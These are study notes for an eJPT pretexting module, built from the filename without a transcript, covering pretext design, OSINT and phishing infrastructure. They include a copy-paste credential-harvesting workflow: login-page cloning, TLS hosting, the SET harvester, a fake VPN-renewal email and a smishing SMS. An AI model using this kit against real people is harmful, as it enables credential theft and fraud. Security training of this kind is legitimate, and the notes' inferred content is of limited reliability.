# 03 - Pretexting (01-SocialEngineering)

Note: No transcript was provided. The following summary is inferred conservatively from the filename and typical eJPT Social Engineering content. Where concrete commands are shown, they are general, copy-paste friendly examples used to support authorized social engineering engagements. Always operate under a signed authorization/Rules of Engagement.

## What the video covers (Introduction / big picture)
- Defines pretexting: crafting a believable story and role to elicit information or actions from a target.
- Why it matters: even strong technical controls can be bypassed if a human trusts the wrong request.
- Core components of a pretext:
  - Identity/role (who you are)
  - Authority/legitimacy (why you’re contacting them)
  - Scenario/hook (what needs to happen, now)
  - Plausibility anchors (internal jargon, timing, systems, names)
  - Ask (what you want them to share/do)
  - Objection handling and exit strategy
- Channels: phone (vishing), email (phishing), SMS (smishing), chat, in-person.
- Preparatory OSINT to make the pretext credible.
- Ethics, scope, consent, safety: only test under written authorization, minimize harm, collect only what’s in scope, protect data.
- Success criteria and evidence: what constitutes a “win” (e.g., elicited data, action performed), and how to document it.

## Flow (ordered)
1. Confirm scope and authorization:
   - What targets are in scope/out of scope, which channels are allowed, time windows, no-go topics, and success criteria.
2. Define objective:
   - What information/action you need (e.g., name/role, VPN creds, MFA approval, internal extension, software version, meeting link).
3. OSINT and reconnaissance:
   - Company org chart, vendors, tech stack, naming conventions, email patterns, support processes, holidays, current events.
4. Choose channel and pretext type:
   - IT helpdesk, third-party vendor, auditor, delivery, HR, payroll, facilities.
5. Build the pretext:
   - Script, opener, assumptions, plausible details, specific ask, objection handling, verification path, exit.
6. Set up infrastructure:
   - Phone/SMS numbers, email sending, domains/landing pages, logging/recording (as allowed), evidence collection.
7. Rehearse and run a dry run:
   - Practice script, timing, jargon; verify links/numbers/SSL; sanity check with test lead.
8. Execute:
   - Initial contact, rapport building, ask, handle objections, close; avoid over-collection and scope creep.
9. Capture evidence:
   - Timestamps, call notes/recordings (if permitted), server logs, screenshots.
10. Debrief and report:
   - Document narrative, artifacts, risk, and recommendations.

## Tools highlighted
- Research/OSINT:
  - theHarvester, Recon-ng, Google Dorking, LinkedIn, Hunter.io, Have I Been Pwned, Epieos, BuiltWith, MXToolbox.
- Phishing/vishing infrastructure:
  - GoPhish, Social-Engineer Toolkit (SET), King Phisher.
  - Domain/DNS/TLS: Namecheap/Cloudflare, Certbot, Nginx/Apache.
  - Email testing: swaks, smtp4dev/MailHog.
  - Phone/SMS (with authorization): Twilio, Linphone/Asterisk, Google Voice/MySudo (compliance-dependent).
- Web cloning/hosting:
  - HTTrack/wget, Nginx, Let’s Encrypt.
- Evidence/logging:
  - tcpdump, Wireshark, web server logs, scriptable screenshots (e.g., wkhtmltoimage), OBS/Audacity (if allowed).
- Wordlists and data:
  - SecLists (usernames, company wordlists), Faker libraries (for fake names/IDs).

## Typical command walkthrough (detailed, copy-paste friendly)

Note: Replace placeholders like target.tld, example.com, user@target.tld, +1TWILIONUM with real values. Use only within approved scope.

- Discover emails, names, hosts with theHarvester:
```
theHarvester -d target.tld -b all -l 500 -s 0 -f theharvester_target.html
```

- Quick DNS intel: MX/SPF/DMARC (helps for email pretext feasibility):
```
dig +short mx target.tld
dig txt target.tld
dig txt _dmarc.target.tld
nslookup -type=txt selector1._domainkey.target.tld
```

- Recon-ng minimal workflow:
```
recon-ng
workspaces create target
marketplace install recon/domains-hosts/bing_domain_web
marketplace install recon/domains-contacts/pgp_search
db insert domains domain=target.tld
modules load recon/domains-hosts/bing_domain_web
run
modules load recon/domains-contacts/pgp_search
run
show hosts
show contacts
exit
```

- Clone a login page (for credential-harvester pretexts; ensure in-scope):
```
# Option 1: HTTrack
httrack https://portal.target.tld -O ./clone --mirror --user-agent "Mozilla/5.0"

# Option 2: wget
wget --mirror --convert-links --adjust-extension --page-requisites --no-parent \
  https://portal.target.tld -P ./clone
```

- Serve the cloned site over TLS with Nginx + Let’s Encrypt:
```
sudo apt update && sudo apt install -y nginx certbot python3-certbot-nginx
sudo mkdir -p /var/www/it-portal
sudo cp -r ./clone/* /var/www/it-portal/

sudo tee /etc/nginx/sites-available/it-portal.conf >/dev/null <<'EOF'
server {
  listen 80;
  server_name it-portal.example.com;
  root /var/www/it-portal;
  index index.html index.php;
  location / {
    try_files $uri $uri/ =404;
  }
}
EOF

sudo ln -s /etc/nginx/sites-available/it-portal.conf /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx

# TLS
sudo certbot --nginx -d it-portal.example.com --non-interactive --agree-tos -m you@example.com
```

- Start SET (Social-Engineer Toolkit) for a credential harvester (interactive):
```
sudo apt install -y set
sudo setoolkit
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner
# Set the POST capture and the URL to clone (e.g., https://portal.target.tld)
```

- Test email delivery and headers with swaks:
```
swaks --server smtp.relay.example --from it-support@vendor.example \
  --to user@target.tld --tls --header "Subject: Action required: VPN cert renewal" --data \
'From: IT Support <it-support@vendor.example>
To: user@target.tld
Subject: Action required: VPN certificate renewal

Hi,
Your VPN certificate expires today. Please visit https://it-portal.example.com to renew.
If you need help, reply to this email or call x1234.
- IT Support'
```

- Send a controlled SMS via Twilio API (authorized tests only):
```
export TWILIO_ACCOUNT_SID="ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
export TWILIO_AUTH_TOKEN="your_auth_token"

curl -X POST https://api.twilio.com/2010-04-01/Accounts/$TWILIO_ACCOUNT_SID/Messages.json \
  --data-urlencode "From=+1TWILIONUM" \
  --data-urlencode "To=+1TARGETNUM" \
  --data-urlencode "Body=IT: Your VPN token reset link (valid 10 min): https://it-portal.example.com" \
  -u $TWILIO_ACCOUNT_SID:$TWILIO_AUTH_TOKEN
```

- Basic logging during engagement:
```
tail -f /var/log/nginx/access.log /var/log/nginx/error.log
sudo tcpdump -i any port 80 or port 443 -w pretext_capture.pcap
```

- Quick wordlist generation (names/roles for scripts):
```
# Build a simple call script wordlist from LinkedIn export (CSV) names
cut -d',' -f1,2 employees.csv | tr ',' ' ' | sort -u > names.txt
```

## Practical tips
- Authorization first: Get a signed Letter of Authorization and clear Rules of Engagement. Confirm whether recording is allowed, which data you may collect, and safe-words.
- Pretext structure:
  - Opener: friendly + authoritative. Mention a known system or internal process.
  - Hook/Reason: time-bounded, low-friction task (e.g., “renewal before 5 PM”).
  - Social proof: reference internal jargon, ticket numbers pattern, extensions, known vendors.
  - The Ask: clear, minimal, and scoped (e.g., “Please confirm your employee ID; I’ll send a reset link.”).
  - Objection handling: offer verification paths (e.g., “You can call back via the directory at x1234; I’ll wait.”).
  - Exit: thank them, close the loop, and document outcomes.
- Credibility enhancers:
  - Use local time zones, business hours, and realistic sender addresses/numbers.
  - Align with real events (patch cycles, audits, onboarding, outages) but don’t claim emergencies that cause operational harm.
- Minimize asks: Prefer innocuous info first (name/role/shift), then escalate. Don’t ask for sensitive info if not required by scope.
- MFA-related pretexts: If permitted, explicitly seek consent in RoE; never create denial-of-service. Avoid excessive push prompts.
- Evidence: Timestamp notes, keep logs, and avoid storing sensitive data beyond what’s permitted. Encrypt at rest.
- Safety and respect: Never threaten or pressure. If a user resists, reward that behavior in your report.
- Have a fallback pretext and escalation path (e.g., “vendor liaison” if “helpdesk” fails).
- Know when to abort: Wrong person, out-of-scope data, or user distress.

## Minimal cheat sheet (one-screen flow)
- Scope: confirm targets, channels, times, data, recording, success criteria.
- Objective: define the minimal info/action to elicit.
- OSINT: names, roles, email format, helpdesk/vendors, tech stack, MX/SPF/DMARC.
- Pretext: choose role + scenario + ask + verification path + exit.
- Infra: domain + TLS + landing page + sender profile + phone/SMS number + logging.
- Dry run: test links/numbers; rehearse script; sanity check.
- Execute: call/email/SMS; rapport; ask; handle objections; close.
- Evidence: logs, timestamps, screenshots/recordings (if allowed).
- Report: what worked, what didn’t, impact, and remediation.

Common commands:
```
theHarvester -d target.tld -b all -l 500 -f report.html
dig +short mx target.tld && dig txt target.tld && dig txt _dmarc.target.tld
wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://portal.target.tld -P ./clone
sudo certbot --nginx -d it-portal.example.com -m you@example.com --agree-tos --non-interactive
swaks --server smtp.relay.example --from it@vendor.example --to user@target.tld --data '...'
tail -f /var/log/nginx/access.log
```

## Summary
The Pretexting module explains how to plan and execute credible, ethical social engineering pretexts. It walks through defining goals, building believable roles and scenarios, preparing infrastructure (domains, email/phone, landing pages), and conducting outreach while handling objections and minimizing risk. It emphasizes lawful/authorized testing, careful OSINT to anchor credibility, and disciplined evidence collection. The provided commands and workflows help you prepare the technical pieces that support a strong, realistic pretext in an eJPT-style engagement.